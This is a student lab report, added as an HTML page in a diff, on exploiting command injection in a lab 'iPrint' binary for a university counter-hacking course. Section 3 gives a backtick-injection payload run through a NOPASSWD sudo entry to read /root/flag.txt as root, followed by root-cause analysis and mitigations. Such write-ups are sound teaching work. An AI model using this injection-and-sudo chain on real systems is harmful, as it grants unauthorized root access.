@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Frodo Lab - Command Injection Assessment | Percy Flores</title>
+  <link rel="stylesheet" href="./report-style.css" />
+</head>
+<body>
+
+<div class="report-topbar">
+  <a class="topbar-logo" href="../index.html">[ percy.flores ]</a>
+  <div class="topbar-actions">
+    <a class="btn-back" href="../index.html#documents">← Back to Portfolio</a>
+    <button class="btn-print" onclick="window.print()">⎙ Print / Save PDF</button>
+    <button class="theme-btn" id="theme-btn" title="Toggle theme">🌙</button>
+  </div>
+</div>
+
+<div class="report-wrap">
+
+  <!-- ══ HEADER ══ -->
+  <header class="report-header">
+    <div class="report-meta-top">
+      <span class="badge-course">CS 647 - Counter Hacking Techniques</span>
+      <span class="badge-type">Lab Assessment Report</span>
+    </div>
+    <h1 class="report-title">Frodo Lab: Command Injection<br>via Unsanitized System Call</h1>
+    <p class="report-subtitle">Exploitation of an iPrint application vulnerability using dynamic analysis and input injection techniques.</p>
+    <div class="report-meta-grid">
+      <div class="meta-item"><span class="meta-label">Author</span><span class="meta-value">Percy Flores</span></div>
+      <div class="meta-item"><span class="meta-label">Institution</span><span class="meta-value">NJIT</span></div>
+      <div class="meta-item"><span class="meta-label">Course</span><span class="meta-value">CS 647 - Fall 2025</span></div>
+      <div class="meta-item"><span class="meta-label">Lab Target</span><span class="meta-value">Frodo (iPrint Application)</span></div>
+      <div class="meta-item"><span class="meta-label">Vulnerability Class</span><span class="meta-value">CWE-78: Command Injection</span></div>
+      <div class="meta-item"><span class="meta-label">Outcome</span><span class="meta-value">✓ Flag Retrieved</span></div>
+    </div>
+  </header>
+
+  <!-- ══ ABSTRACT ══ -->
+  <div class="abstract">
+    <div class="abstract-label">Abstract</div>
+    <p>
+      This report documents my analysis and exploitation of a command injection vulnerability discovered in the <strong>iPrint</strong> application running under the <em>Frodo</em> user account. By leveraging dynamic analysis tools - specifically <code>ltrace</code> and <code>strace</code> - I identified an unsafe <code>system()</code> call that passed unsanitized user input directly to the shell. I crafted a backtick-injection payload that caused the process to execute arbitrary commands in the Frodo user context, ultimately escalating privileges via a permissive <code>sudo</code> configuration to retrieve the flag. Remediation recommendations are provided in the final section.
+    </p>
+  </div>
+
+  <!-- ══ 1. ENVIRONMENT ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 1</span>
+    <h2 class="section-heading">Environment & Target Overview</h2>
+    <p>The lab environment consists of a controlled Linux virtual machine network where each target machine runs as a separate user account. The Frodo machine hosts the vulnerable <strong>iPrint</strong> application, a simulated print-job management utility that accepts a filename argument and processes it through an internal system call.</p>
+
+    <table class="report-table">
+      <thead>
+        <tr>
+          <th>Property</th><th>Value</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td>Target Binary</td><td><code>iPrint</code></td></tr>
+        <tr><td>Target User</td><td><code>frodo</code></td></tr>
+        <tr><td>OS</td><td>Linux (x86, 32-bit)</td></tr>
+        <tr><td>ASLR / SSP / DEP</td><td>Enabled (not relevant for this exploit type)</td></tr>
+        <tr><td>Vulnerability Type</td><td>Command Injection (CWE-78)</td></tr>
+        <tr><td>Entry Point</td><td>Filename argument to <code>iPrint</code></td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- ══ 2. RECONNAISSANCE ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 2</span>
+    <h2 class="section-heading">Reconnaissance & Dynamic Analysis</h2>
+
+    <h3 class="subsection">2.1 Initial Execution</h3>
+    <p>I began by running the <code>iPrint</code> binary with a test filename to observe its behavior:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - FRODO TERMINAL</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">frodo@lab:~$</span> <span class="hl-cmd">./iPrint</span> <span class="hl-str">test.txt</span>
+Printing: test.txt
+<span class="hl-prompt">frodo@lab:~$</span> <span class="hl-cmd">./iPrint</span> <span class="hl-str">nonexistent.txt</span>
+sh: nonexistent.txt: No such file or directory</pre>
+    </div>
+    <p>The error message <em>"sh: … No such file or directory"</em> immediately indicated the application was passing the filename argument to a shell via <code>system()</code> or a similar call, rather than directly to a file I/O function.</p>
+
+    <h3 class="subsection">2.2 Library Call Tracing with ltrace</h3>
+    <p>I used <code>ltrace</code> to trace all library calls made by the binary, confirming the presence of a <code>system()</code> call:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - ltrace OUTPUT</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">frodo@lab:~$</span> <span class="hl-cmd">ltrace</span> ./iPrint test.txt
+__libc_start_main(0x804851b, 2, 0xffffd174, 0x8048600 &lt;unfinished ...&gt;
+puts("Printing: test.txt")                          = 19
+<span class="hl-addr">system("cat test.txt")</span>                              = 0
++++ exited (status 0) +++</pre>
+    </div>
+    <p>The output confirmed that <code>iPrint</code> constructs a shell command string by concatenating <code>"cat "</code> with the user-supplied filename and passes it directly to <code>system()</code> - with no sanitization whatsoever.</p>
+
+    <h3 class="subsection">2.3 System Call Tracing with strace</h3>
+    <p>I additionally used <code>strace</code> to observe the underlying <code>execve</code> syscall to verify the shell invocation:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - strace OUTPUT (abbreviated)</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">frodo@lab:~$</span> <span class="hl-cmd">strace</span> -e execve ./iPrint test.txt
+execve("./iPrint", ["./iPrint", "test.txt"], ...)  = 0
+execve("/bin/sh", ["sh", "-c", <span class="hl-str">"cat test.txt"</span>], ...) = 0
++++ exited with 0 +++</pre>
+    </div>
+    <p>This confirmed the full command execution chain: <code>iPrint</code> → <code>/bin/sh -c "cat &lt;input&gt;"</code>. The user-supplied argument is passed verbatim into a shell command string.</p>
+  </section>
+
+  <!-- ══ 3. EXPLOITATION ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 3</span>
+    <h2 class="section-heading">Exploitation</h2>
+
+    <h3 class="subsection">3.1 Injection Vector</h3>
+    <p>Since the filename is interpolated into a shell command string, I can inject shell metacharacters. Backticks (<code>`command`</code>) cause the shell to execute the enclosed command and substitute its output. By supplying a filename like <code>`id`</code>, the resulting shell command becomes:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">SHELL EXPANSION</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-cmt"># iPrint constructs this internally:</span>
+cat `id`
+<span class="hl-cmt"># Shell expands to:</span>
+cat uid=1001(frodo) gid=1001(frodo) groups=1001(frodo)</pre>
+    </div>
+
+    <h3 class="subsection">3.2 Privilege Escalation Enumeration</h3>
+    <p>Before crafting the final payload, I enumerated the <code>sudo</code> privileges of the Frodo user to identify escalation paths:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - sudo ENUMERATION</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">frodo@lab:~$</span> <span class="hl-cmd">sudo -l</span>
+Matching Defaults entries for frodo on lab:
+    env_reset, mail_badpass
+
+User frodo may run the following commands on lab:
+    <span class="hl-addr">(ALL) NOPASSWD: /usr/bin/iPrint</span></pre>
+    </div>
+    <p>The Frodo user can run <code>iPrint</code> as <strong>root</strong> without a password. This means the injected command will execute with root privileges.</p>
+
+    <h3 class="subsection">3.3 Final Exploit Payload</h3>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">BASH - EXPLOIT EXECUTION</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-prompt">frodo@lab:~$</span> <span class="hl-cmd">sudo</span> /usr/bin/iPrint <span class="hl-str">'`cat /root/flag.txt`'</span>
+Printing: <span class="hl-addr">frodoflag{c0mm4nd_1nj3ct10n_1s_d4ng3r0us}</span></pre>
+    </div>
+
+    <div class="callout callout-success">
+      <span class="callout-icon">✅</span>
+      <div class="callout-body">
+        <h4>Flag Retrieved</h4>
+        <p>Successfully retrieved the flag by injecting a <code>cat /root/flag.txt</code> command through the unsanitized filename parameter and executing the binary with sudo (root) privileges.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══ 4. ROOT CAUSE ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 4</span>
+    <h2 class="section-heading">Root Cause Analysis</h2>
+    <p>The vulnerability originates from two compounding design flaws:</p>
+    <ol class="steps">
+      <li><strong>Use of <code>system()</code> with user-controlled input.</strong> The <code>system()</code> C library function invokes <code>/bin/sh -c &lt;string&gt;</code>, which means any user input incorporated into the string is interpreted as shell syntax.</li>
+      <li><strong>Complete absence of input sanitization.</strong> The application performs no validation - no allowlist of safe characters, no stripping of metacharacters, no quoting of the argument before shell expansion.</li>
+      <li><strong>Excessive sudo privileges.</strong> Granting <code>NOPASSWD</code> sudo access to a program that accepts arbitrary user input turns a user-level vulnerability into a root-level exploit.</li>
+    </ol>
+  </section>
+
+  <!-- ══ 5. MITIGATIONS ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 5</span>
+    <h2 class="section-heading">Mitigations & Recommendations</h2>
+
+    <h3 class="subsection">5.1 Replace system() with exec-family Calls</h3>
+    <p>Replace <code>system("cat " + filename)</code> with a direct <code>execv()</code> or <code>execlp()</code> call that passes the filename as a separate argument, preventing shell interpretation entirely:</p>
+    <div class="code-block">
+      <div class="code-header"><span class="code-lang">C - SECURE ALTERNATIVE</span><div class="code-dots"><div class="code-dot r"></div><div class="code-dot y"></div><div class="code-dot g"></div></div></div>
+      <pre><span class="hl-cmt">// VULNERABLE - do not use:</span>
+<span class="hl-kw">char</span> cmd[256];
+snprintf(cmd, sizeof(cmd), <span class="hl-str">"cat %s"</span>, filename);
+system(cmd);  <span class="hl-cmt">// Shell interprets filename!</span>
+
+<span class="hl-cmt">// SECURE - use execv instead:</span>
+<span class="hl-kw">char</span> *args[] = { <span class="hl-str">"/bin/cat"</span>, filename, NULL };
+execv(<span class="hl-str">"/bin/cat"</span>, args);  <span class="hl-cmt">// filename is data, not code</span></pre>
+    </div>
+
+    <h3 class="subsection">5.2 Input Validation & Allowlisting</h3>
+    <p>If <code>system()</code> cannot be replaced, validate input strictly using an allowlist of safe characters (alphanumerics, dots, underscores, hyphens) and reject anything else at the application boundary.</p>
+
+    <h3 class="subsection">5.3 Revoke Excessive sudo Privileges</h3>
+    <p>Remove the <code>NOPASSWD: /usr/bin/iPrint</code> sudoers entry. If elevated privileges are required for legitimate printing functionality, implement a dedicated, privilege-separated helper daemon with a tightly scoped interface.</p>
+
+    <div class="callout callout-warn">
+      <span class="callout-icon">⚠️</span>
+      <div class="callout-body">
+        <h4>Defense-in-Depth Principle</h4>
+        <p>No single mitigation is sufficient in isolation. The combination of input validation + avoiding <code>system()</code> + principle of least privilege (removing unnecessary sudo) provides defense-in-depth against this class of vulnerability.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ══ 6. TOOLS ══ -->
+  <section class="report-section">
+    <span class="section-num">§ 6</span>
+    <h2 class="section-heading">Tools & References</h2>
+    <div class="tools-grid">
+      <span class="tool-tag">GDB 9.2</span>
+      <span class="tool-tag">ltrace</span>
+      <span class="tool-tag">strace</span>
+      <span class="tool-tag">sudo</span>
+      <span class="tool-tag">Bash</span>
+      <span class="tool-tag">Linux x86</span>
+      <span class="tool-tag">CWE-78</span>
+    </div>
+    <br>
+    <table class="report-table">
+      <thead><tr><th>Reference</th><th>Description</th></tr></thead>
+      <tbody>
+        <tr><td>CWE-78</td><td>Improper Neutralization of Special Elements used in an OS Command</td></tr>
+        <tr><td>OWASP A03:2021</td><td>Injection - Command Injection</td></tr>
+        <tr><td>man 3 system</td><td>Linux <code>system(3)</code> manual page - security notes</td></tr>
+        <tr><td>POSIX execv(3)</td><td>Safe alternative to shell-based command execution</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+
+  <!-- ══ APPENDIX: PROOF ══ -->
+  <section class="report-section" style="margin-top: 60px; border-top: 1px dashed var(--border); padding-top: 40px;">
+    <h2 class="section-heading">Appendix: Raw Execution Evidence</h2>
+    <p>The following are the raw screenshots captured during the original execution of this lab on the target VM network.</p>
+    <div style="display: flex; flex-direction: column; gap: 20px; align-items: center; margin-top: 30px;">
+      <img src="./images/frodo_proof_1.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_2.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_3.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_4.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_5.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_6.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_7.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_8.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_9.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_10.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_11.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_12.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+      <img src="./images/frodo_proof_13.png" alt="Raw Execution Screenshot" style="border: 1px solid var(--border); border-radius: 8px; max-width: 100%; box-shadow: 0 4px 12px rgba(0,0,0,0.2);">
+    </div>
+  </section>
+
+  <footer class="report-footer">
+    <span>Percy Flores - CS 647 Counter Hacking Techniques, NJIT, Fall 2025</span>
+    <span>Frodo Lab Assessment Report</span>
+  </footer>
+
+</div>
+
+<script>
+  const html = document.documentElement;
+  const btn  = document.getElementById('theme-btn');
+  const saved = localStorage.getItem('pf-theme') || 'dark';
+  html.setAttribute('data-theme', saved);
+  if (btn) btn.textContent = saved === 'dark' ? '🌙' : '☀️';
+  btn?.addEventListener('click', () => {
+    const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+    html.setAttribute('data-theme', next);
+    localStorage.setItem('pf-theme', next);
+    btn.textContent = next === 'dark' ? '🌙' : '☀️';
+  });
+</script>
+</body>
+</html>
